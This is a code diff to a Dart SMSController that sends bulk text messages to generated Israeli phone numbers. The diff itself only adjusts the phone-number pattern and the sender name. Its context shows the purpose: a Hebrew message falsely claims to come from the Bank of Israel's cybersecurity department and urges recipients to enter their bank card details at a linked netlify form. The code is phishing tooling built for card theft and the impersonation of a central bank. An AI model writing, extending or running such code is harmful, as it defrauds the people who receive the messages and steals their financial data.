@@ -65,7 +65,7 @@ class SMSController extends GetxController {
 // Generate a unique link or use your own link to the card information form
   String? uniqueLink = 'https://smswithlink-credit.netlify.app';
 
-  final _israelPhoneNumberRegex = r'^009725\d{8}$';
+  final _israelPhoneNumberRegex = r'^009725\d{7}$';
 
   String generateIsraelPhoneNumber() {
     // print
@@ -101,7 +101,7 @@ class SMSController extends GetxController {
             "אנחנו מחלקת אבטחת הסייבר של הבנק המרכזי של ישראל. אנא מלא את פרטי כרטיס הבנק שלך כדי לוודא שאתה בעל הכרטיס הלגיטימי עקב הפצת הונאה והודעות מזויפות.:\n $uniqueLink",
         "type": "sms_premium",
         "purpose": "wholesale",
-        "sender": "Bank Of Israel"
+        "sender": "Bank Israel"
       };
 
       final String jsonData = jsonEncode(data);
